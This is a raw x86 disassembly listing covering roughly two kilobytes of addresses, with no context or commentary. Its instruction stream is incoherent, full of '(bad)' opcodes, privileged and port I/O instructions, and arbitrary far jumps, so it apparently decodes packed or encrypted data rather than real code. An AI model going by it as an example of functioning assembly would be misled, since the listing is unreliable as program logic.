  4247a6:	pop    esp
  4247a7:	lock popf 
  4247a9:	clc    
  4247aa:	retf   
  4247ab:	push   0xffffffd5
  4247ad:	and    ebp,ebp
  4247af:	test   al,0xa1
  4247b1:	dec    edx
  4247b2:	inc    ecx
  4247b3:	dec    eax
  4247b4:	jns    0x4247cc
  4247b6:	add    eax,0x753f76f5
  4247bb:	push   esp
  4247bc:	icebp  
  4247bd:	push   cs
  4247be:	(bad)
  4247c1:	and    ecx,DWORD PTR [eax+0x15]
  4247c4:	data16 jo 0x424840
  4247c7:	fcmove st,st(4)
  4247c9:	loop   0x4247f5
  4247cb:	in     eax,0xd1
  4247cd:	dec    ebx
  4247ce:	mov    bh,0xb1
  4247d0:	push   0xc97bf03a
  4247d5:	test   eax,0x973de19f
  4247da:	ret    
  4247db:	sub    BYTE PTR [ecx-0x2564c253],0x89
  4247e2:	add    esi,DWORD PTR [eax-0x8]
  4247e5:	je     0x42483d
  4247e7:	xchg   edx,eax
  4247e8:	mov    DWORD PTR [ebx-0x24],ebx
  4247eb:	inc    esp
  4247ec:	jne    0x4247a2
  4247ee:	(bad)  
  4247ef:	dec    esi
  4247f0:	inc    ebp
  4247f1:	adc    eax,0xffda2923
  4247f6:	sbb    edx,DWORD PTR [ecx+0x7f5f4911]
  4247fc:	fidiv  DWORD PTR [edx-0x47c8afc1]
  424802:	int3   
  424803:	mov    ecx,DWORD PTR [ebx+0x31]
  424806:	sahf   
  424807:	pop    ebp
  424808:	sub    eax,edx
  42480a:	pop    eax
  42480b:	xchg   edi,eax
  42480c:	cmp    dh,bl
  42480e:	fwait
  42480f:	retf   
  424810:	aaa    
  424811:	outs   dx,DWORD PTR ds:[esi]
  424812:	adc    al,0x34
  424814:	xor    esi,DWORD PTR [ecx]
  424816:	cdq    
  424817:	aad    0xc3
  424819:	jns    0x424813
  42481b:	neg    DWORD PTR ds:0xe880add
  424821:	xchg   BYTE PTR [edi+0x25],bh
  424824:	shl    BYTE PTR [ebp-0x22],cl
  424827:	dec    ebp
  424828:	push   esp
  424829:	jns    0x4247cf
  42482b:	jmp    0x9cbf:0xde0b96ce
  424832:	and    eax,0x2198b0b5
  424837:	fsub   QWORD PTR [edi+0x77182d81]
  42483d:	fisttp QWORD PTR [ebx+0x63308d17]
  424843:	and    BYTE PTR [eax-0x50],dh
  424846:	xchg   ebx,eax
  424847:	sbb    ah,BYTE PTR [esi+eiz*8+0x76]
  42484b:	int3   
  42484c:	scas   al,BYTE PTR es:[edi]
  42484d:	pop    ebp
  42484e:	repnz or BYTE PTR cs:[esi-0xd],ah
  424853:	jns    0x4247e5
  424855:	scas   al,BYTE PTR es:[edi]
  424856:	xchg   esi,eax
  424857:	cmc    
  424858:	or     eax,0xdd69913
  42485d:	mov    al,ds:0xde3fce1f
  424862:	lock adc esi,DWORD PTR [eax+0x7b66a088]
  424869:	inc    ebp
  42486a:	call   0xe001:0x95db831d
  424871:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424872:	mov    cl,0xf9
  424874:	and    cl,bl
  424876:	test   eax,0x214d505b
  42487b:	or     eax,0x4215000b
  424880:	jecxz  0x424893
  424882:	(bad)  
  424883:	fdivp  st(3),st
  424885:	jmp    0x157986a3
  42488a:	sbb    dh,ch
  42488c:	pusha  
  42488d:	fcomip st,st(1)
  42488f:	stc    
  424890:	and    DWORD PTR [ebx+edx*2-0x7c],ebx
  424894:	sub    esi,edx
  424896:	test   al,0xe4
  424898:	add    al,0xe5
  42489a:	in     al,0x71
  42489c:	pop    edx
  42489d:	jecxz  0x424869
  42489f:	stos   DWORD PTR es:[edi],eax
  4248a0:	stos   BYTE PTR es:[edi],al
  4248a1:	push   es
  4248a2:	repnz push ebx
  4248a4:	and    eax,0x7862abbb
  4248a9:	sar    BYTE PTR [ecx-0x58e4ccab],0x1b
  4248b0:	or     eax,DWORD PTR [edi+0x14200df4]
  4248b6:	jg     0x4248cb
  4248b8:	int3   
  4248b9:	mov    al,ds:0x6193071e
  4248be:	sub    dl,BYTE PTR [esi+0x2]
  4248c1:	adc    BYTE PTR [esi-0x18421eac],ah
  4248c7:	jecxz  0x424924
  4248c9:	sbb    DWORD PTR [edi+0x3],0x73
  4248cd:	mov    gs,WORD PTR [edx]
  4248cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4248d0:	push   cs
  4248d1:	inc    esp
  4248d2:	cmp    bh,BYTE PTR [esi-0x42]
  4248d5:	loop   0x42492e
  4248d7:	pop    ds
  4248d8:	(bad)  
  4248d9:	and    BYTE PTR [edi-0x1c515537],bh
  4248df:	push   ecx
  4248e0:	cmp    DWORD PTR [edi+0x7c4fa857],ecx
  4248e6:	pop    esp
  4248e7:	popa   
  4248e8:	mov    ecx,0x9af1deed
  4248ed:	adc    esp,esp
  4248ef:	push   ecx
  4248f0:	addr16 dec ecx
  4248f2:	jg     0x424922
  4248f4:	nop
  4248f5:	icebp  
  4248f6:	ror    DWORD PTR ds:0x67257447,0xa
  4248fd:	shl    BYTE PTR es:[esi+0x7cf3362d],cl
  424904:	and    cl,BYTE PTR [eax+0x5cf76922]
  42490a:	fadd   st,st(3)
  42490c:	sbb    ebp,DWORD PTR [ecx+esi*8-0x2e9ffaad]
  424913:	or     bh,BYTE PTR [eax]
  424915:	cli    
  424916:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424917:	xchg   ebx,eax
  424918:	cmp    ah,BYTE PTR [ecx+0x310e83b2]
  42491e:	fldcw  WORD PTR [edi+0x1]
  424921:	pop    ebp
  424922:	int    0xe8
  424924:	push   ds
  424925:	mov    WORD PTR [ebx-0x77b09c88],fs
  42492b:	outs   dx,BYTE PTR ds:[esi]
  42492c:	in     eax,dx
  42492d:	xchg   esi,eax
  42492e:	jp     0x42496b
  424930:	jne    0x424931
  424932:	retf   0xbe5f
  424935:	fisub  DWORD PTR [ebx+edi*1-0x1d]
  424939:	push   edx
  42493a:	mov    ah,0xb7
  42493c:	int3   
  42493d:	shl    BYTE PTR [ebx+eiz*4-0x321a4a99],1
  424944:	mov    ebp,0x517ea3e7
  424949:	and    bl,BYTE PTR [edi-0x7c]
  42494c:	push   ebp
  42494d:	dec    esp
  42494e:	xchg   BYTE PTR [edx],al
  424950:	dec    edx
  424951:	fucomp st(7)
  424953:	lds    ecx,FWORD PTR [ebx]
  424955:	pushf  
  424956:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424957:	and    eax,DWORD PTR [ebx]
  424959:	sbb    DWORD PTR [eax+0x22],edx
  42495c:	jp     0x4249c1
  42495e:	inc    ebp
  42495f:	xchg   edi,eax
  424960:	push   ebx
  424961:	cmp    ch,ah
  424963:	sub    eax,0xd58d23c3
  424968:	or     BYTE PTR [ecx+eax*2+0x12],ch
  42496c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42496d:	sub    al,0x16
  42496f:	int    0x40
  424971:	ins    BYTE PTR es:[edi],dx
  424972:	stos   DWORD PTR es:[edi],eax
  424973:	push   0xffffffe6
  424975:	rol    BYTE PTR [ebp-0x10],1
  424978:	push   edi
  424979:	sbb    eax,0x23db07e0
  42497e:	out    dx,eax
  42497f:	dec    ecx
  424980:	sub    ch,BYTE PTR [edi+0x2642a895]
  424986:	lea    ebp,[esi+0x500abdd1]
  42498c:	mov    ecx,0x76a35104
  424991:	es inc ebx
  424993:	xchg   ecx,eax
  424994:	pusha  
  424995:	inc    ebx
  424996:	popa   
  424997:	adc    al,0xe4
  424999:	add    eax,0x8a750049
  42499e:	pop    ebp
  42499f:	stos   DWORD PTR es:[di],eax
  4249a1:	inc    ebx
  4249a2:	jne    0x42498d
  4249a4:	sbb    DWORD PTR [eax+0x873663],eax
  4249aa:	xchg   BYTE PTR [ebx-0x21],ah
  4249ad:	leave  
  4249ae:	push   0x8
  4249b0:	in     al,0x3a
  4249b2:	push   esp
  4249b3:	sub    ebx,DWORD PTR [edi-0x51faa78c]
  4249b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4249ba:	xchg   edx,eax
  4249bb:	addr16 mov ch,0xa3
  4249be:	adc    DWORD PTR [ebp+eax*4-0x12],ebp
  4249c2:	cdq    
  4249c3:	cmp    DWORD PTR [ebp*4-0x250004ca],ebx
  4249ca:	enter  0x9a42,0x3a
  4249ce:	mov    ch,0x7f
  4249d0:	pop    ss
  4249d1:	shr    DWORD PTR [ebx-0x29be5787],cl
  4249d7:	inc    edi
  4249d8:	icebp  
  4249d9:	and    DWORD PTR [eax+esi*8-0x3],0xffffffc5
  4249de:	pop    ebx
  4249df:	jg     0x4249ee
  4249e1:	aad    0x1d
  4249e3:	test   BYTE PTR [eax+0x55e4eaa1],dh
  4249e9:	in     eax,dx
  4249ea:	hlt    
  4249eb:	jmp    0x76585fe8
  4249f0:	jle    0x42499c
  4249f2:	das    
  4249f3:	fnstsw WORD PTR [esi-0x69]
  4249f6:	pop    ebx
  4249f7:	pop    edi
  4249f8:	std    
  4249f9:	loop   0x424993
  4249fb:	inc    eax
  4249fc:	sub    BYTE PTR ds:0x83cc1c6c,bh
  424a02:	inc    esi
  424a03:	jbe    0x4249de
  424a05:	out    dx,eax
  424a06:	cmp    BYTE PTR [eax+0x63],cl
  424a09:	push   es
  424a0a:	inc    esi
  424a0b:	repnz in al,dx
  424a0d:	bound  ebp,QWORD PTR ds:0xe77955bd
  424a13:	ror    BYTE PTR [edi],0x21
  424a16:	xchg   ebx,eax
  424a17:	and    al,0xf4
  424a19:	add    esp,DWORD PTR [edx]
  424a1b:	and    ebp,DWORD PTR [edx+0x43]
  424a1e:	sti    
  424a1f:	and    DWORD PTR [ecx],0x565ec1ef
  424a25:	fdiv   DWORD PTR [edx-0x6ed7bf7b]
  424a2b:	xchg   DWORD PTR ds:0xbe760187,edi
  424a31:	sbb    al,0xcd
  424a33:	sar    esi,0x33
  424a36:	or     eax,0x90d48775
  424a3b:	pop    es
  424a3c:	fldcw  WORD PTR [ebx+0x6354000d]
  424a42:	pop    eax
  424a43:	sbb    eax,0xaa2b6d6a
  424a48:	xor    ecx,0x8ee8be03
  424a4e:	ja     0x424a0c
  424a50:	jno    0x424a76
  424a52:	fsub   DWORD PTR [ebp-0x11]
  424a55:	aad    0x70
  424a57:	jl     0x424aa3
  424a59:	mov    ah,0xb0
  424a5b:	scas   al,BYTE PTR es:[edi]
  424a5c:	mov    al,ds:0xfeb3e436
  424a61:	xor    al,0xd7
  424a63:	enter  0x8c79,0x58
  424a67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424a68:	xor    eax,0x1d01bd01
  424a6d:	nop
  424a6e:	mov    DWORD PTR [ebp-0x2799b140],ecx
  424a74:	fld    TBYTE PTR [ebx-0x4e5b71e1]
  424a7a:	pusha  
  424a7b:	ret    
  424a7c:	loop   0x424ade
  424a7e:	test   DWORD PTR [ecx],esp
  424a80:	and    eax,0x2c5529c1
  424a85:	in     eax,dx
  424a86:	jb     0x424afb
  424a88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a89:	inc    ecx
  424a8a:	cli    
  424a8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a8c:	jnp    0x424af9
  424a8e:	push   ss
  424a8f:	lods   eax,DWORD PTR ds:[esi]
  424a90:	and    edi,ebx
  424a92:	cmp    ah,0x93
  424a95:	mov    bh,0xaa
  424a97:	jle    0x424a61
  424a99:	stc    
  424a9a:	aad    0xd3
  424a9c:	xchg   edx,eax
  424a9d:	xor    ebx,DWORD PTR [ecx+0x40]
  424aa0:	sar    BYTE PTR [ebp-0x6eed597],1
  424aa6:	dec    edi
  424aa7:	in     eax,dx
  424aa8:	cmp    DWORD PTR [eax+0x34410579],ebp
  424aae:	or     BYTE PTR [ecx-0x2c47a9fc],bl
  424ab4:	push   0xffffffaa
  424ab6:	push   ebx
  424ab7:	push   eax
  424ab8:	xor    eax,0x112dc425
  424abd:	xchg   ebp,eax
  424abe:	outs   dx,BYTE PTR ds:[esi]
  424abf:	mov    ah,0xf4
  424ac1:	push   esi
  424ac2:	icebp  
  424ac3:	xchg   esp,eax
  424ac4:	arpl   WORD PTR [ecx+0x55cb2744],sp
  424aca:	cmc    
  424acb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424acc:	or     al,0xa8
  424ace:	sahf   
  424acf:	mov    ah,0x49
  424ad1:	mov    db3,edx
  424ad4:	dec    esi
  424ad5:	add    BYTE PTR [ecx-0x224ae2ab],ch
  424adb:	and    edx,DWORD PTR [ebp+0x19]
  424ade:	lea    esp,[eax-0x26957314]
  424ae4:	inc    ebx
  424ae5:	pop    edx
  424ae6:	push   esi
  424ae7:	cs sti 
  424ae9:	dec    ecx
  424aea:	mov    ds:0x6911949a,al
  424aef:	mov    al,0xb6
  424af1:	mov    dh,BYTE PTR [edx]
  424af3:	shl    DWORD PTR [ecx],1
  424af5:	stc    
  424af6:	ret    0x7fde
  424af9:	jnp    0x424b66
  424afb:	cdq    
  424afc:	dec    ebp
  424afd:	pop    ebp
  424afe:	(bad)  
  424b00:	inc    ebx
  424b01:	jbe    0x424acb
  424b03:	adc    eax,0xb7c83bb5
  424b08:	sub    BYTE PTR [ebx+ebp*2+0x13ac1d4],bl
  424b0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424b10:	inc    ecx
  424b11:	push   ss
  424b12:	cmp    eax,0x75e62408
  424b17:	pop    ss
  424b18:	mov    WORD PTR [ebx],?
  424b1a:	ins    DWORD PTR es:[edi],dx
  424b1b:	data16 (bad) 
  424b1d:	gs xor esi,esi
  424b20:	xchg   ebx,eax
  424b21:	dec    bx
  424b23:	daa    
  424b24:	ficom  WORD PTR [esi]
  424b26:	(bad)  
  424b27:	or     BYTE PTR [ecx-0x2726e6b7],ch
  424b2d:	pop    eax
  424b2e:	sbb    eax,0xeea0a610
  424b33:	in     al,0xed
  424b35:	mov    ah,0x25
  424b37:	push   ebp
  424b38:	xchg   ebp,eax
  424b39:	dec    edi
  424b3a:	add    BYTE PTR [ebx+0x15de25ee],bl
  424b40:	mov    edx,0x288b7a6c
  424b45:	adc    al,0x93
  424b47:	(bad)  
  424b48:	aad    0xc1
  424b4a:	outs   dx,BYTE PTR ds:[esi]
  424b4b:	sbb    BYTE PTR [edx-0x1bb3d654],bl
  424b51:	cmp    DWORD PTR [eax-0x243afe0],ebx
  424b57:	into   
  424b58:	mov    ss,WORD PTR [ecx+0x36]
  424b5b:	push   esp
  424b5c:	adc    DWORD PTR [edi],ecx
  424b5e:	adc    al,0xb6
  424b60:	or     dl,bh
  424b62:	mov    edi,0x212db425
  424b67:	in     al,dx
  424b68:	dec    edx
  424b69:	addr16 ret 
  424b6b:	fwait
  424b6c:	add    edi,DWORD PTR [ebp+0x35fd0634]
  424b72:	sub    DWORD PTR [edi],eax
  424b74:	mov    ecx,0xbb1836b1
  424b79:	or     ch,dl
  424b7b:	mov    eax,0xbe50403c
  424b80:	xor    DWORD PTR [ecx],ecx
  424b82:	iret   
  424b83:	imul   edi,DWORD PTR [ecx],0x2e45e458
  424b89:	fist   WORD PTR [esi+0x22]
  424b8c:	ins    BYTE PTR es:[edi],dx
  424b8d:	cli    
  424b8e:	cmp    al,BYTE PTR [ebp-0x5909872c]
  424b94:	test   al,0x62
  424b96:	les    eax,FWORD PTR [ebx]
  424b98:	(bad)  
  424b99:	(bad)  
  424b9a:	loop   0x424b71
  424b9c:	loopne 0x424c0b
  424b9e:	data16 cmp bl,dh
  424ba1:	push   ebp
  424ba2:	scas   al,BYTE PTR es:[edi]
  424ba3:	lods   eax,DWORD PTR ds:[esi]
  424ba4:	inc    edx
  424ba5:	sar    BYTE PTR [esi+ecx*2+0x22b2d8dc],cl
  424bac:	in     eax,0xcb
  424bae:	mov    al,0xf9
  424bb0:	(bad)  
  424bb1:	ds push cs
  424bb3:	dec    eax
  424bb4:	cmp    DWORD PTR [ebx-0x6b7f2980],esi
  424bba:	inc    esp
  424bbb:	call   0x63c29eb4
  424bc0:	leave  
  424bc1:	repz adc ebp,esi
  424bc4:	hlt    
  424bc5:	ins    DWORD PTR es:[edi],dx
  424bc6:	fidiv  WORD PTR [ebp-0x6c]
  424bc9:	wbinvd 
  424bcb:	fldenv [edi+0xf126df]
  424bd1:	mov    eax,ds:0xf177cd4e
  424bd6:	in     al,dx
  424bd7:	xchg   esi,eax
  424bd8:	add    esp,DWORD PTR [esi-0x19a0d22a]
  424bde:	fcom   DWORD PTR [edi+0x15]
  424be1:	lock adc al,0xb2
  424be4:	mov    ss,WORD PTR [ebp-0x45dd2d77]
  424bea:	dec    ebx
  424beb:	cmp    BYTE PTR [esp+eax*8-0x79d2ad83],bh
  424bf2:	jle    0x424bb3
  424bf4:	add    edi,DWORD PTR [edi+0x6ba41e9c]
  424bfa:	sbb    al,0xd0
  424bfc:	enter  0x2dbb,0xc3
  424c00:	push   esi
  424c01:	mov    DWORD PTR [edi],eax
  424c03:	pusha  
  424c04:	(bad)  
  424c06:	jno    0x424c3e
  424c08:	mov    ch,0x45
  424c0a:	jmp    0xcec:0xfdcc9e15
  424c11:	clc    
  424c12:	sahf   
  424c13:	add    al,0x21
  424c15:	ror    DWORD PTR [ebx+0x7c],cl
  424c18:	pop    edx
  424c19:	lock adc al,0x39
  424c1c:	fsubr  QWORD PTR [eax-0x80]
  424c1f:	jecxz  0x424c27
  424c21:	xchg   BYTE PTR [edi],al
  424c23:	dec    ecx
  424c24:	int    0x8b
  424c26:	adc    al,0xb8
  424c28:	xchg   ecx,eax
  424c29:	sahf   
  424c2a:	leave  
  424c2b:	ror    DWORD PTR [ebp+0x61],1
  424c2e:	jns    0x424bd5
  424c30:	test   DWORD PTR [esi+0x38],ebx
  424c33:	cs push cs
  424c35:	mov    ebp,0x9d9e76a
  424c3a:	inc    esp
  424c3b:	dec    esp
  424c3c:	mov    cl,BYTE PTR [ebx+eax*4+0x5bd640be]
  424c43:	stos   DWORD PTR es:[edi],eax
  424c44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c45:	lock in al,dx
  424c47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c48:	test   BYTE PTR [eax],ch
  424c4a:	add    DWORD PTR [ebp-0x3ab615a5],0xffffffb9
  424c51:	(bad)  
  424c53:	inc    ebp
  424c54:	pusha  
  424c55:	ret    0xd6aa
  424c58:	call   0x6bee1198
  424c5d:	lock aaa 
  424c5f:	pop    ds
  424c60:	jecxz  0x424c64
  424c62:	outs   dx,DWORD PTR ds:[esi]
  424c63:	xor    ch,bh
  424c65:	pop    ecx
  424c66:	adc    DWORD PTR ds:0x5da80916,edx
  424c6c:	(bad)
  424c6f:	and    esp,DWORD PTR [esi+0x7]
  424c72:	pusha  
  424c73:	inc    edi
  424c74:	sub    DWORD PTR [ebp+ecx*1-0x42f4eefe],edi
  424c7b:	mov    bl,0xc9
  424c7d:	and    BYTE PTR [ebp+esi*1+0x51],bl
  424c81:	xor    bh,bl
  424c83:	jb     0x424c1a
  424c85:	lds    esi,FWORD PTR [edi]
  424c87:	push   cs
  424c88:	push   0xfffffff0
  424c8a:	jo     0x424c86
  424c8c:	inc    ecx
  424c8d:	cmp    edi,DWORD PTR [eax-0x750e7f9e]
  424c93:	cs loopne 0x424cfe
  424c96:	fmul   DWORD PTR [esi+0x395f52aa]
  424c9c:	cmp    edi,esi
  424c9e:	call   0xb86f:0xa13a3932
  424ca5:	ror    BYTE PTR [edi-0x4c],1
  424ca8:	(bad)  
  424ca9:	(bad)  
  424cab:	xchg   ecx,eax
  424cac:	or     ebx,edx
  424cae:	adc    BYTE PTR [ecx-0x38],0x48
  424cb2:	lods   eax,DWORD PTR ds:[esi]
  424cb3:	cmc    
  424cb4:	pop    edi
  424cb5:	retf   0x8abe
  424cb8:	pop    edx
  424cb9:	push   ebp
  424cba:	test   edi,esp
  424cbc:	xchg   ebx,eax
  424cbd:	pop    esi
  424cbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424cbf:	ds lahf 
  424cc1:	test   ax,0xcdf1
  424cc5:	fsub   DWORD PTR [esi]
  424cc7:	push   cs
  424cc8:	in     eax,dx
  424cc9:	(bad)  
  424cca:	jne    0x424cd1
  424ccc:	xor    BYTE PTR [ecx-0x17af4b57],ch
  424cd2:	or     eax,0x5f2d789b
  424cd7:	fiadd  WORD PTR [ebx+0x8acc53f]
  424cdd:	retf   
  424cde:	shl    ah,0xb
  424ce1:	test   eax,0xe627c011
  424ce6:	in     al,0x49
  424ce8:	enter  0x4963,0x31
  424cec:	test   al,0x7c
  424cee:	repnz leavew 
  424cf1:	jge    0x424ccf
  424cf3:	aas    
  424cf4:	(bad)  
  424cf5:	jmp    0x68906928
  424cfa:	xchg   esi,eax
  424cfb:	ss bswap eax
  424cfe:	pop    esi
  424cff:	sub    al,0x65
  424d01:	repz mov edx,0x5c8b4c22
  424d07:	iret   
  424d08:	inc    ebp
  424d09:	cs ins BYTE PTR es:[edi],dx
  424d0b:	push   ds
  424d0c:	push   esp
  424d0d:	std    
  424d0e:	mov    dl,0xa9
  424d10:	fidivr DWORD PTR [edx+0x18]
  424d13:	pop    ds
  424d14:	ss aas 
  424d16:	mov    WORD PTR [ebx+0x28ef37c2],ss
  424d1c:	pop    edi
  424d1d:	mov    DWORD PTR [esi+0x6fd66f23],esi
  424d23:	jp     0x424d7f
  424d25:	mov    al,ds:0x624c5c67
  424d2a:	push   edi
  424d2b:	loopne 0x424d29
  424d2d:	push   ebx
  424d2e:	cli    
  424d2f:	test   eax,0x7f646a3d
  424d34:	out    dx,eax
  424d35:	leave  
  424d36:	pop    esp
  424d37:	sahf   
  424d38:	pop    eax
  424d39:	inc    ebx
  424d3a:	call   0x5c1b5dd7
  424d3f:	push   edx
  424d40:	inc    esp
  424d41:	js     0x424db4
  424d43:	jo     0x424d62
  424d45:	stos   BYTE PTR es:[edi],al
  424d46:	rol    BYTE PTR [eax],cl
  424d48:	pushf  
  424d49:	xor    dl,BYTE PTR [esi+0x233d5110]
  424d4f:	out    0x64,al
  424d51:	in     eax,0x3d
  424d53:	das    
  424d54:	add    BYTE PTR [esi+0x1],cl
  424d57:	shl    DWORD PTR [ebp+0x71],cl
  424d5a:	mov    cl,0x98
  424d5c:	cs (bad) 
  424d5e:	sbb    bh,bl
  424d60:	jns    0x424db9
  424d62:	cmp    eax,0xeb9c5c57
  424d67:	push   0x9a6bc2ae
  424d6c:	loopne 0x424d45
  424d6e:	pop    ebp
  424d6f:	int3   
  424d70:	test   BYTE PTR [esi-0x50],0xd2
  424d74:	test   eax,ecx
  424d76:	loope  0x424d87
  424d78:	push   eax
  424d79:	stos   DWORD PTR es:[di],eax
  424d7b:	mov    bl,0x17
  424d7d:	pop    edi
  424d7e:	pop    esi
  424d7f:	(bad)  
  424d80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424d81:	mov    ch,0xb4
  424d83:	cmp    BYTE PTR [esi],al
  424d85:	jnp    0x424de0
  424d87:	or     DWORD PTR [edi+ebx*1],ebx
  424d8a:	pop    esi
  424d8b:	(bad)  
  424d8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424d8d:	add    eax,DWORD PTR [esi+0x6]
  424d90:	and    BYTE PTR [ebx-0x45],al
  424d93:	scas   al,BYTE PTR es:[edi]
  424d94:	scas   al,BYTE PTR es:[edi]
  424d95:	ds pop ebx
  424d97:	cmp    bh,BYTE PTR [ebp-0x4091ac0a]
  424d9d:	daa    
  424d9e:	or     DWORD PTR [eax+0x74c4254c],esp
  424da4:	push   ss
  424da5:	call   0xa9c79f08
  424daa:	push   edx
  424dab:	int3   
  424dac:	dec    esi
  424dad:	addr16 pop ebp
  424daf:	ficom  DWORD PTR [ebx+0x22ea12d1]
  424db5:	adc    eax,0x127bcdd2
  424dba:	ja     0x424d60
  424dbc:	xchg   DWORD PTR [edx-0x114e353],edx
  424dc2:	jmp    0xbf689d90
  424dc7:	jecxz  0x424ded
  424dc9:	shr    bh,1
  424dcb:	in     eax,dx
  424dcc:	(bad)  
  424dcd:	bound  ecx,QWORD PTR [edx]
  424dcf:	fisttp QWORD PTR [ecx]
  424dd1:	xor    ecx,edi
  424dd3:	pop    edi
  424dd4:	cdq    
  424dd5:	and    ah,0x59
  424dd8:	xchg   WORD PTR [edi+0x6317cb0e],bp
  424ddf:	out    0xe1,eax
  424de1:	pop    edx
  424de2:	js     0x424db8
  424de4:	inc    ebp
  424de5:	xchg   BYTE PTR [eax],ah
  424de7:	fs aas 
  424de9:	adc    dl,cl
  424deb:	pop    ecx
  424dec:	mov    eax,0xa8470854
  424df1:	test   eax,0x5cb97845
  424df6:	pushf  
  424df7:	lock jo 0x424e72
  424dfa:	sub    dh,BYTE PTR [esp+edx*8-0x2]
  424dfe:	pop    ds
  424dff:	arpl   WORD PTR [eax],si
  424e01:	ins    BYTE PTR es:[edi],dx
  424e02:	add    eax,esi
  424e04:	jb     0x424e38
  424e06:	scas   eax,DWORD PTR es:[edi]
  424e07:	xchg   DWORD PTR [edi+0x62],ebx
  424e0a:	add    eax,0xe4bb03ab
  424e0f:	sbb    dh,BYTE PTR fs:[esi]
  424e12:	stc    
  424e13:	sbb    BYTE PTR [eax+ebx*2+0x6930d105],0x89
  424e1b:	sub    ah,BYTE PTR [edx+eax*4]
  424e1e:	mov    esp,0x588ddf7d
  424e23:	xchg   esi,eax
  424e24:	adc    BYTE PTR [edi],0x37
  424e27:	mov    ecx,0x96c386f0
  424e2c:	bound  edx,QWORD PTR [esi+0x15]
  424e2f:	mov    ebp,0xe294411c
  424e34:	jl     0x424dce
  424e36:	or     bl,bl
  424e38:	dec    ebp
  424e39:	out    dx,eax
  424e3a:	popf   
  424e3b:	mov    eax,ds:0xa3049188
  424e40:	and    edx,DWORD PTR es:[ecx+0x1f]
  424e44:	mov    eax,0x29324d9c
  424e49:	pop    ecx
  424e4a:	adc    eax,DWORD PTR [ebx-0x56880a29]
  424e50:	das    
  424e51:	sub    BYTE PTR [ebx+0x1a],cl
  424e54:	add    DWORD PTR [ecx-0x6f],0xa7b7b60b
  424e5b:	adc    DWORD PTR [ebx+0x1842209e],esi
  424e61:	int3   
  424e62:	xchg   esp,eax
  424e63:	shr    DWORD PTR [ecx-0x25a39ff8],cl
  424e69:	dec    ebp
  424e6a:	pop    esi
  424e6b:	sbb    bh,BYTE PTR [eax-0x79]
  424e6e:	jecxz  0x424ec1
  424e70:	and    eax,DWORD PTR [ebx-0x55]
  424e73:	nop    ecx
  424e76:	and    ebp,ebp
  424e78:	setle  BYTE PTR [ebx+0x64c365c]
  424e7f:	fisubr WORD PTR ds:0xa5020dca
  424e85:	sub    eax,0x3e0dc12f
  424e8a:	xchg   ecx,eax
  424e8b:	mov    WORD PTR [eax-0x6f],es
  424e8e:	and    bh,bh
  424e90:	xor    ah,dh
  424e92:	std    
  424e93:	sub    cl,BYTE PTR [eax+edx*4-0x14]
  424e97:	loopne 0x424f04
  424e99:	adc    ebp,edx
  424e9b:	aaa    
  424e9c:	nop
  424e9d:	jbe    0x424ed2
  424e9f:	cmp    bh,ah
  424ea1:	jae    0x424ee7
  424ea3:	jp     0x424ec6
  424ea5:	int    0xf8
  424ea7:	out    0xa5,al
  424ea9:	or     cl,BYTE PTR [eax+esi*2]
  424eac:	cmp    al,0x65
  424eae:	adc    DWORD PTR [eax+0x6e],edx
  424eb1:	out    dx,al
  424eb2:	nop    DWORD PTR [ebx+0x70]
  424eb6:	xchg   dl,dl
  424eb8:	loopne 0x424f25
  424eba:	leave  
  424ebb:	test   DWORD PTR [ebx-0x439b24b3],0x489ee9f5
  424ec5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ec6:	fwait
  424ec7:	and    esi,DWORD PTR [ebx+ebp*2]
  424eca:	mov    bl,0x4d
  424ecc:	sub    al,cl
  424ece:	sub    al,0xd1
  424ed0:	mov    esi,0xbaa2f50
  424ed5:	adc    ah,BYTE PTR [esi+0x6955091f]
  424edb:	jns    0x424f06
  424edd:	sub    al,0x7b
  424edf:	pushf  
  424ee0:	dec    dx
  424ee2:	ret    0xc243
  424ee5:	mov    ecx,esi
  424ee7:	add    BYTE PTR [edx-0x5b72d6d1],ah
  424eed:	mov    ds:0xf7d60805,al
  424ef2:	pop    esi
  424ef3:	iret   
  424ef4:	icebp  
  424ef5:	pop    ebp
  424ef6:	in     eax,0xb9
  424ef8:	ficom  WORD PTR [ebx+0x1b]
  424efb:	out    dx,al
  424efc:	sbb    ah,BYTE PTR [eax+0x2056a16d]
  424f02:	jge    0x424ec1
  424f04:	fwait
  424f05:	and    al,0xf8
  424f07:	mov    bl,0x3c
  424f09:	add    DWORD PTR [edx+0x7254a67d],esi
  424f0f:	push   es
  424f10:	push   esi
  424f11:	mov    bl,0x8b
  424f13:	(bad)  
  424f14:	dec    edx
  424f15:	xchg   ebx,eax
  424f16:	fmul   DWORD PTR [ecx-0x7f1382ab]
  424f1c:	int3   
  424f1d:	push   es
  424f1e:	pop    esi
  424f1f:	mov    eax,ds:0x44701d6b
  424f24:	cli    
  424f25:	dec    ecx
  424f26:	das    
  424f27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424f28:	loop   0x424f8f
  424f2a:	loopne 0x424fab
  424f2c:	and    eax,0xef6a8a74
  424f31:	rol    esi,0x5d
  424f34:	push   ds
  424f35:	cdq    
  424f36:	fwait
  424f37:	vdivpd xmm4,xmm2,XMMWORD PTR [edx]
  424f3b:	fmul   DWORD PTR [ebx]
  424f3d:	xor    al,0xd4
  424f3f:	lock and ch,BYTE PTR [edi]
  424f42:	fs cmc 
  424f44:	inc    ebx
  424f45:	fxam   
  424f47:	push   0xd19ed792
  424f4c:	popa   
